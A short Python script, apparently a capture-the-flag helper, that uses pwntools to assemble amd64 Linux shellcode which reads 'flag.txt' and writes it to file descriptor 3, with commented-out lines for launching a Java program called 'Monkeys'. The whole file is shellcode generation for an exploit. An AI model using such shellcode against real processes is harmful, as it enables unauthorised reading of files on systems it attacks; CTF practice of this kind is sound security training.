
import sys
from pwn import *
context.arch = 'amd64'

#exe = '/usr/bin/java'

#io = process([exe] + ["-Xshare:on", "-Djava.library.path=target/release", "Monkeys"])

shellcode = shellcraft.amd64.linux.cat("flag.txt", fd=3)
print(asm(shellcode))
